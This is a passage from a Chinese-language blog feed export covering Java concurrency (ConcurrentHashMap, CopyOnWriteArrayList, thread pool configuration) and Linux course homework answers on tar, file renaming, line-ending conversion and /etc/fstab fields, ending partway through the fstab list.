<p><code>ConcurrentHashMap</code> 提供了一些原子性的复合操作，如 <code>putIfAbsent</code>、<code>compute</code>、<code>computeIfAbsent</code> 、<code>computeIfPresent</code>、<code>merge</code>等。这些方法都可以接受一个函数作为参数，根据给定的 key 和 value 来计算一个新的 value，并且将其更新到 map 中。</p>
<h2 id="三-ConcurrentHashMap-为什么-key-和-value-不能为-null？"><a href="#三-ConcurrentHashMap-为什么-key-和-value-不能为-null？" class="headerlink" title="三 ConcurrentHashMap 为什么 key 和 value 不能为 null？"></a>三 ConcurrentHashMap 为什么 key 和 value 不能为 null？</h2><p><code>ConcurrentHashMap</code> 的 key 和 value 不能为 null 主要是为了避免二义性。null 是一个特殊的值，表示没有对象或没有引用。如果你用 null 作为键，那么你就无法区分这个键是否存在于 <code>ConcurrentHashMap</code> 中，还是根本没有这个键。同样，如果你用 null 作为值，那么你就无法区分这个值是否是真正存储在 <code>ConcurrentHashMap</code> 中的，还是因为找不到对应的键而返回的。</p>
<p>与此形成对比的是，<code>HashMap</code> 可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个。如果传入 null 作为参数，就会返回 hash 值为 0 的位置的值。单线程环境下，不存在一个线程操作该 HashMap 时，其他的线程将该 <code>HashMap</code> 修改的情况，所以可以通过 <code>contains(key)</code>来做判断是否存在这个键值对，从而做相应的处理，也就不存在二义性问题。</p>
<p>也就是说，多线程下无法正确判定键值对是否存在（存在其他线程修改的情况），单线程是可以的（不存在其他线程修改的情况）。或者是单线程下可以容忍歧义，而多线程下无法容忍。</p>
<h1 id="CopyOnWriteArrayList详解"><a href="#CopyOnWriteArrayList详解" class="headerlink" title="CopyOnWriteArrayList详解"></a>CopyOnWriteArrayList详解</h1><p>在JDK1.5之前，实现线程安全的List为Vector，但是Vector是一个增删改查都要加synchronized锁的老旧集合，已经被淘汰。在JDK1.5中，引入了一个新的线程安全的List——CopyOnWriteArrayList。</p>
<p>CopyOnWriteArrayList的读取操作是完全不需要加锁的，同时写操作也不会阻塞读操作，只有写写互斥，极大地提高了性能。</p>
<p>CopyOnWriteArrayList线程安全的核心在于其采用了 <strong>写时复制（Copy-On-Write）</strong> 的策略，当需要修改（ <code>add</code>，<code>set</code>、<code>remove</code> 等操作） CopyOnWriteArrayList 的内容时，不会直接修改原数组，而是会先创建底层数组的副本，对副本数组进行修改，修改完之后再将修改后的数组赋值回去，这样就可以保证写操作不会影响读操作了。</p>
<p>不过，写时复制机制并不是银弹，其依然存在一些缺点，下面列举几点：</p>
<ol>
<li>内存占用：每次写操作都需要复制一份原始数据，会占用额外的内存空间，在数据量比较大的情况下，可能会导致内存资源不足。</li>
<li>写操作开销：每一次写操作都需要复制一份原始数据，然后再进行修改和替换，所以写操作的开销相对较大，在写入比较频繁的场景下，性能可能会受到影响。</li>
<li>数据一致性问题：修改操作不会立即反映到最终结果中，还需要等待复制完成，这可能会导致一定的数据一致性问题。</li>
<li>……</li>
</ol>
]]></content>
      <categories>
        <category>Java面经</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>面试</tag>
        <tag>hashmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Java并发——线程池</title>
    <url>/2025/03/01/Java%E5%B9%B6%E5%8F%91%E2%80%94%E2%80%94%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="线程池参数"><a href="#线程池参数" class="headerlink" title="线程池参数"></a>线程池参数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize,//线程池的核心线程数量</span></span><br><span class="line"><span class="params">                              <span class="type">int</span> maximumPoolSize,//线程池的最大线程数</span></span><br><span class="line"><span class="params">                              <span class="type">long</span> keepAliveTime,//当线程数大于核心线程数时，多余的空闲线程存活的最长时间</span></span><br><span class="line"><span class="params">                              TimeUnit unit,//时间单位</span></span><br><span class="line"><span class="params">                              BlockingQueue&lt;Runnable&gt; workQueue,//任务队列，用来储存等待执行任务的队列</span></span><br><span class="line"><span class="params">                              ThreadFactory threadFactory,//线程工厂，用来创建线程，一般默认即可</span></span><br><span class="line"><span class="params">                              RejectedExecutionHandler handler//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务</span></span><br><span class="line"><span class="params">                               )</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (corePoolSize &lt; <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt;= <span class="number">0</span> ||</span><br><span class="line">            maximumPoolSize &lt; corePoolSize ||</span><br><span class="line">            keepAliveTime &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="keyword">if</span> (workQueue == <span class="literal">null</span> || threadFactory == <span class="literal">null</span> || handler == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="built_in">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">        <span class="built_in">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">        <span class="built_in">this</span>.workQueue = workQueue;</span><br><span class="line">        <span class="built_in">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">        <span class="built_in">this</span>.threadFactory = threadFactory;</span><br><span class="line">        <span class="built_in">this</span>.handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>一共七个参数：</p>
<ul>
<li>corePoolSize 核心线程数量，任务队列未达到队列容量时，最大可以同时运行的线程数量</li>
<li>maximumPoolSize 最大线程数量，任务队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数</li>
<li>keepAliveTime：当线程数大于核心线程数时，多余的空闲线程存活的最长时间</li>
<li>unit：时间单位</li>
<li>workQueue：任务队列，新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中</li>
<li>threadFactory：线程工厂，用来创建线程，一般默认即可</li>
<li>handler：拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务</li>
</ul>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/relationship-between-thread-pool-parameters.png" alt="线程池各个参数的关系" style="zoom:50%;" />

<p><strong>关于拒绝策略RejectedExecutionHandler handler：</strong></p>
<p>如果当前同时运行的线程数量达到最大线程数量并且队列也已经被放满了任务时，ThreadPoolExecutor 定义一些策略:</p>
<ul>
<li><code>ThreadPoolExecutor.AbortPolicy</code>：抛出 <code>RejectedExecutionException</code>来拒绝新任务的处理。</li>
<li><code>ThreadPoolExecutor.CallerRunsPolicy</code>：调用执行自己的线程运行任务，也就是直接在调用<code>execute</code>方法的线程中运行(<code>run</code>)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，你可以选择这个策略。</li>
<li><code>ThreadPoolExecutor.DiscardPolicy</code>：不处理新任务，直接丢弃掉。</li>
<li><code>ThreadPoolExecutor.DiscardOldestPolicy</code>：此策略将丢弃最早的未处理的任务请求。</li>
</ul>
<h2 id="线程池原理分析"><a href="#线程池原理分析" class="headerlink" title="线程池原理分析"></a>线程池原理分析</h2><ol>
<li><p>如果当前运行的线程数小于核心线程数，那么就会新建一个线程来执行任务。</p>
</li>
<li><p>如果当前运行的线程数等于或大于核心线程数，但是小于最大线程数，那么就把该任务放入到任务队列里等待执行。</p>
</li>
<li><p>如果向任务队列投放任务失败（任务队列已经满了），但是当前运行的线程数是小于最大线程数的，就新建一个线程来执行任务。</p>
</li>
<li><p>如果当前运行的线程数已经等同于最大线程数了，新建线程将会使当前运行的线程超出最大线程数，那么当前任务会被拒绝，拒绝策略会调用<code>RejectedExecutionHandler.rejectedExecution()</code>方法。</p>
</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250228163621662.png" alt="image-20250228163621662"></p>
<h2 id="线程池使用示例代码"><a href="#线程池使用示例代码" class="headerlink" title="线程池使用示例代码"></a>线程池使用示例代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadPoolExecutorDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CORE_POOL_SIZE</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_POOL_SIZE</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">QUEUE_CAPACITY</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Long</span> <span class="variable">KEEP_ALIVE_TIME</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过ThreadPoolExecutor构造函数自定义参数创建</span></span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">                CORE_POOL_SIZE,</span><br><span class="line">                MAX_POOL_SIZE,</span><br><span class="line">                KEEP_ALIVE_TIME,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(QUEUE_CAPACITY),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//创建WorkerThread对象（WorkerThread类实现了Runnable 接口）</span></span><br><span class="line">            <span class="type">Runnable</span> <span class="variable">worker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyRunnable</span>(<span class="string">&quot;&quot;</span> + i);</span><br><span class="line">            <span class="comment">//执行Runnable</span></span><br><span class="line">            executor.execute(worker);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//终止线程池</span></span><br><span class="line">        executor.shutdown();</span><br><span class="line">        <span class="keyword">while</span> (!executor.isTerminated()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Finished all threads&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="常见内置线程池"><a href="#常见内置线程池" class="headerlink" title="常见内置线程池"></a>常见内置线程池</h2><h3 id="常见阻塞队列"><a href="#常见阻塞队列" class="headerlink" title="常见阻塞队列"></a>常见阻塞队列</h3><ol>
<li>LinkedBlockingQueue（无界队列）：容量为Integer.MAX_VALUE。</li>
<li>SynchronousQueue（同步队列）：没有容量，不存储元素，目的是保证对于提交的任务，如果有空闲线程，则使用空闲线程来处理；否则新建一个线程来处理任务。</li>
<li>DelayedWorkQueue（延迟阻塞队列）：内部元素并不是按照放入的时间排序，而是会按照延迟的时间长短对任务进行排序，内部采用的是“堆”的数据结构，可以保证每次出队的任务都是当前队列中执行时间最靠前的。队列元素满了之后会自动扩容原来容量的 1&#x2F;2，即永远不会阻塞，最大扩容可达Integer.MAX_VALUE。</li>
</ol>
<h3 id="常见内置线程池-1"><a href="#常见内置线程池-1" class="headerlink" title="常见内置线程池"></a>常见内置线程池</h3><p>除了使用ThreadPoolExecutor executor &#x3D; new ThreadPoolExecutor(…）的方法来创建线程池，还可以通过Excutors来创建Java内置的一些线程池，这些线程池本质上还是 new ThreadPoolExecutor()，但规定了不同的参数和使用了不同的阻塞队列。</p>
<p>《阿里巴巴 Java 开发手册》强制线程池不允许使用 <code>Executors</code> 去创建，而是通过 <code>ThreadPoolExecutor</code> 构造函数的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险</p>
<h4 id="FixedThreadPool"><a href="#FixedThreadPool" class="headerlink" title="FixedThreadPool"></a>FixedThreadPool</h4><p>一个可重用固定线程数的线程池</p>
<ul>
<li>corePoolSize 和 maximumPoolSize 都被设置为 nThreads</li>
<li>使用的是无界队列LinkedBlockingQueue（由于容量永远不会满，所以即使超过核心线程数也永远不会再新建线程，因此使用这种队列的核心线程数就是最大线程数）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads,</span><br><span class="line">                                      <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                      <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());</span><br></pre></td></tr></table></figure>

<p>具体的，一开始当前运行的线程数小于核心线程数， 来新任务时就创建新的线程来执行任务；当达到核心线程数后，新的任务会进入队列，队列永远不会满，线程池中的线程循环从队列中取出任务来执行。</p>
<p>运行中的 FixedThreadPool（未执行 <code>shutdown()</code>或 <code>shutdownNow()</code>）不会拒绝任务，在任务比较多的时候会导致 OOM（内存溢出）。</p>
<h4 id="SingleThreadExcutor"><a href="#SingleThreadExcutor" class="headerlink" title="SingleThreadExcutor"></a>SingleThreadExcutor</h4><p>只有一个线程的线程池，可以看作FixedThreadPool的单线程版本。</p>
<ul>
<li>corePoolSize 和 maximumPoolSize 都被设置为 1</li>
<li>其他参数与FixedThreadPool相同</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FinalizableDelegatedExecutorService</span></span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                    <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;(),</span><br><span class="line">                                    threadFactory));</span><br></pre></td></tr></table></figure>

<h4 id="CachedThreadPool"><a href="#CachedThreadPool" class="headerlink" title="CachedThreadPool"></a>CachedThreadPool</h4><ul>
<li>corePoolSize &#x3D; 0</li>
<li>maximumPoolSize &#x3D; Integer.MAX_VALUE</li>
<li>使用同步队列SynchronousQueue</li>
<li>keepAliveTime &#x3D; 60 秒</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                     <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                     <span class="keyword">new</span> <span class="title class_">SynchronousQueue</span>&lt;Runnable&gt;(),</span><br><span class="line">                                     threadFactory);</span><br></pre></td></tr></table></figure>

<p>核心线程数为0，最大线程数为Integer.MAX_VALUE，使用无容量的SynchronousQueue，这就意味着每当有新的任务加入时，如果没有空闲线程，都会创建新的线程来执行。</p>
<p>这也意味着如果线程的处理速度赶不上提交任务的速度，CachedThreadPool可以不断创建出大量的线程，从而导致OOM（内存溢出）。</p>
<h4 id="ScheduledThreadPool"><a href="#ScheduledThreadPool" class="headerlink" title="ScheduledThreadPool"></a>ScheduledThreadPool</h4><ul>
<li>corePoolSize</li>
<li>maximumPoolSize &#x3D; Integer.MAX_VALUE</li>
<li>使用延迟阻塞队列DelayedWorkQueue</li>
<li>keepAliveTime &#x3D; 0</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(corePoolSize, Integer.MAX_VALUE,</span><br><span class="line">		  <span class="number">0</span>, NANOSECONDS,</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">DelayedWorkQueue</span>());</span><br></pre></td></tr></table></figure>

<p>首先由于延迟阻塞队列DelayedWorkQueue可以不断扩容，永远不会满，因此最多只能创建核心线程数的线程。同时队列中按照延迟的时间长度进行排序。因此ScheduledThreadPool可以用来在给定的延迟后运行任务或者定期执行任务。</p>
<h2 id="一些其他比较"><a href="#一些其他比较" class="headerlink" title="一些其他比较"></a>一些其他比较</h2><h3 id="Runnable-vs-Callable"><a href="#Runnable-vs-Callable" class="headerlink" title="Runnable vs Callable"></a>Runnable vs Callable</h3><p>Runnable自 Java 1.0 以来一直存在，但Callable仅在 Java 1.5 中引入,目的就是为了来处理Runnable不支持的用例。</p>
<p>Runnable接口不会返回结果或抛出检查异常，但是Callable接口可以。所以，如果任务不需要返回结果或抛出异常推荐使用 Runnable 接口，这样代码看起来会更加简洁。</p>
<p>工具类 Executors可以实现将 Runnable对象转换成 Callable对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 被线程执行，没有返回值也无法抛出异常</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Callable</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算结果，或在无法这样做时抛出异常。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 计算得出的结果</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> 如果无法计算结果，则抛出异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    V <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="execute-vs-submit"><a href="#execute-vs-submit" class="headerlink" title="execute() vs submit()"></a>execute() vs submit()</h3><p><code>execute()</code> 和 <code>submit()</code>是两种提交任务到线程池的方法，有一些区别：</p>
<p><strong>返回值</strong>：<code>execute()</code> 方法用于提交不需要返回值的任务。通常用于执行 <code>Runnable</code> 任务，无法判断任务是否被线程池成功执行。<code>submit()</code> 方法用于提交需要返回值的任务。可以提交 <code>Runnable</code> 或 <code>Callable</code> 任务。<code>submit()</code> 方法返回一个 <code>Future</code> 对象，通过这个 <code>Future</code> 对象可以判断任务是否执行成功，并获取任务的返回值。</p>
<p>示例，通过future.get()方法获取返回，该方法会阻塞当前线程直到任务完成。还有一个get(long timeout,TimeUnit unit)，多了一个超时时间。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">Future&lt;String&gt; submit = executorService.submit(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">5000L</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> submit.get();</span><br><span class="line">System.out.println(s);</span><br><span class="line">executorService.shutdown();</span><br></pre></td></tr></table></figure>

<p><strong>异常处理</strong>：在使用 <code>submit()</code> 方法时，可以通过 <code>Future</code> 对象处理任务执行过程中抛出的异常；而在使用 <code>execute()</code> 方法时，异常处理需要通过自定义的 <code>ThreadFactory</code> （在线程工厂创建线程的时候设置<code>UncaughtExceptionHandler</code>对象来 处理异常）或 <code>ThreadPoolExecutor</code> 的 <code>afterExecute()</code> 方法来处理。</p>
<h3 id="shutdown-vs-shoutdownNow"><a href="#shutdown-vs-shoutdownNow" class="headerlink" title="shutdown() vs shoutdownNow()"></a>shutdown() vs shoutdownNow()</h3><p><strong><code>shutdown（）</code></strong> :关闭线程池，线程池的状态变为 <code>SHUTDOWN</code>。线程池不再接受新任务了，但是队列里的任务得执行完毕。</p>
<p><strong><code>shutdownNow（）</code></strong> :关闭线程池，线程池的状态变为 <code>STOP</code>。线程池会终止当前正在运行的任务，并停止处理排队的任务并返回正在等待执行的 List。</p>
<h3 id="isTerminated-vs-isShutdown"><a href="#isTerminated-vs-isShutdown" class="headerlink" title="isTerminated() vs isShutdown()"></a>isTerminated() vs isShutdown()</h3><ul>
<li><strong><code>isShutDown</code></strong> 当调用 <code>shutdown()</code> 方法后返回为 true。</li>
<li><strong><code>isTerminated</code></strong> 当调用 <code>shutdown()</code> 方法后，并且所有提交的任务完成后返回为 true</li>
</ul>
<h2 id="线程池最佳实践"><a href="#线程池最佳实践" class="headerlink" title="线程池最佳实践"></a>线程池最佳实践</h2><ol>
<li>线程池必须手动通过 <code>ThreadPoolExecutor</code> 的构造函数来声明，避免使用<code>Executors</code> 类创建线程池，会有 OOM 风险。也就是<strong>使用有界队列，控制线程创建数量。</strong></li>
<li>检测线程池运行状态。<code>ThreadPoolExecutor</code>提供了获取线程池当前的线程数和活跃线程数、已经执行完成的任务数、正在排队中的任务数等等。</li>
<li>不同的业务使用不同的线程池，配置线程池的时候根据当前业务的情况对当前线程池进行配置，因为不同的业务的并发以及对资源的使用情况都不同，重心优化系统性能瓶颈相关的业务。（一个案例：父子任务使用同一个线程池，父任务使用完线程资源，子任务一直被阻塞在队列，可能导致死锁）</li>
<li>给线程池命名（设置线程池名称前缀），有利于定位问题。</li>
<li><strong>线程池尽量不要放耗时任务</strong>。线程池本身的目的是为了提高任务执行效率，避免因频繁创建和销毁线程而带来的性能开销。如果将耗时任务提交到线程池中执行，可能会导致线程池中的线程被长时间占用，无法及时响应其他任务，甚至会导致线程池崩溃或者程序假死。</li>
<li>别忘记显式地关闭线程池，释放线程资源。</li>
<li>线程池和 <code>ThreadLocal</code>共用，可能会导致线程从<code>ThreadLocal</code>获取到的是旧值&#x2F;脏数据。这是因为线程池会复用线程对象，与线程对象绑定的类的静态属性 <code>ThreadLocal</code> 变量也会被重用，这就导致一个线程可能获取到其他线程的<code>ThreadLocal</code> 值。</li>
<li>合理设置线程池参数。</li>
</ol>
<p>对于最后一点，补充：</p>
<ul>
<li><p>如果我们设置的线程池数量太小的话，如果同一时间有大量任务&#x2F;请求需要处理，可能会导致大量的请求&#x2F;任务在任务队列中排队等待执行，甚至会出现任务队列满了之后任务&#x2F;请求无法处理的情况，或者大量任务堆积在任务队列导致 OOM。这样很明显是有问题的，CPU 根本没有得到充分利用。</p>
</li>
<li><p>如果我们设置线程数量太大，大量线程可能会同时在争取 CPU 资源，这样会导致大量的上下文切换，从而增加线程的执行时间，影响了整体执行效率。</p>
</li>
</ul>
<p>有一个简单并且适用面比较广的公式：</p>
<ul>
<li><strong>CPU 密集型任务 (N)：</strong> 这种任务消耗的主要是 CPU 资源，线程数应设置为 N（CPU 核心数）。由于任务主要瓶颈在于 CPU 计算能力，与核心数相等的线程数能够最大化 CPU 利用率，过多线程反而会导致竞争和上下文切换开销。</li>
<li><strong>I&#x2F;O 密集型任务(M * N)：</strong> 这类任务大部分时间处理 I&#x2F;O 交互，线程在等待 I&#x2F;O 时不占用 CPU。 为了充分利用 CPU 资源，线程数可以设置为 M * N，其中 N 是 CPU 核心数，M 是一个大于 1 的倍数，建议默认设置为 2 ，具体取值取决于 I&#x2F;O 等待时间和任务特点，需要通过测试和监控找到最佳平衡点。</li>
</ul>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计-作业</title>
    <url>/2024/12/15/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h3 id="作业一"><a href="#作业一" class="headerlink" title="作业一"></a>作业一</h3><h4 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h4><p><em>a)将当前目录下所有文件备份并压缩成 tar.gz，如果成功再将备份拷贝到 &#x2F;backup 目录下。</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar czf backup.tar.gz *</span><br><span class="line"><span class="built_in">cp</span> backup.tar.gz /backup</span><br></pre></td></tr></table></figure>

<p><em>b) 将上述备份压缩后的文件解压到原来的目录。</em></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">tar xzf <span class="string">/backup/backup.tar.gz</span> <span class="string">./</span> </span><br></pre></td></tr></table></figure>

<p><em>c) 将当前目录下所有后缀为.html的文件的后缀改为.htm。</em></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">rename <span class="string">.html</span> <span class="string">.htm</span> *<span class="string">.html</span></span><br></pre></td></tr></table></figure>

<p><em>d) 将当前目录下所有子目录下以a开头的.cpp文件改名为以b开头的.c文件。</em></p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">type</span> f -<span class="built_in">name</span> <span class="string">&quot;a*.cpp&quot;</span> -<span class="built_in">exec</span> rename <span class="string">&quot;s/^a(.*)\.cpp$/b\$1\.c/&quot;</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h4><p><em>a) 请简要叙述DOS&#x2F;Windows中的文本文件，UNIX&#x2F;Linux中的文本文件以及Mac中的文本文件有何不同 之处，并给出至少一种你认为较为实用的转换方案。(需要两两给出转换方案)</em></p>
<ul>
<li>DOS&#x2F;Windows 中的文本文件使用 \r\n 作为换行符，用 .txt 或 .doc 等扩展名表示。</li>
<li>UNIX&#x2F;Linux 中的文本文件使用 \n 作为换行符，用 .txt 或没有扩展名表示。</li>
<li>Mac 中的文本文件使用 \r 作为换行符，用 .txt 或 .doc 等扩展名表示。</li>
</ul>
<p>转换方案：</p>
<ul>
<li><p>从DOS &#x2F; Windows转换为UNIX &#x2F; Linux</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/\r$//&quot;</span> <span class="built_in">file</span>.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>从UNIX &#x2F; Linux转换为DOS &#x2F; Windows：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/$/\r/&quot;</span> <span class="built_in">file</span>.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>从Mac转换为UNIX &#x2F; Linux：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> <span class="keyword">file</span>.txt | <span class="keyword">tr</span> <span class="string">&quot;\r&quot;</span> <span class="string">&quot;\n&quot;</span> &gt; newfile.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>从UNIX &#x2F; Linux转换为Mac：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> <span class="keyword">file</span>.txt | <span class="keyword">tr</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;\r&quot;</span> &gt; newfile.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>从DOS &#x2F; Windows转换为Mac</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> <span class="keyword">file</span>.txt | <span class="keyword">tr</span> -d <span class="string">&quot;\n&quot;</span> &gt; newfile.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>从Mac转换为DOS &#x2F; Windows</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> <span class="keyword">file</span>.txt | <span class="keyword">tr</span> <span class="string">&quot;\r&quot;</span> <span class="string">&quot;\n&quot;</span> | sed <span class="string">&#x27;s/$/\r/&#x27;</span> &gt; newfile.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>b) 请查阅 Linux 系统中&#x2F;etc&#x2F;fstab 文件各字段功能，并对你自己安装的 Linux 系统中&#x2F;etc&#x2F;fstab 的各个字段做出解释。</em></p>
<p>有以下字段：<strong>&lt;file system&gt;  &lt;mount point&gt;  &lt;type&gt;  &lt;options&gt;  &lt;dump&gt;  &lt;pass&gt;</strong></p>
<ul>
<li>&lt;file system&gt;  ：要挂载的文件系统的设备名或UUID等标识符，如&#x2F;dev&#x2F;sda1、UUID&#x3D;xxxxxx等</li>
<li>&lt;mount point&gt;：文件系统挂载到的目录，即文件系统挂载的目标目录</li>
<li>&lt;type&gt;：文件系统的类型，例如ext4、ntfs等</li>
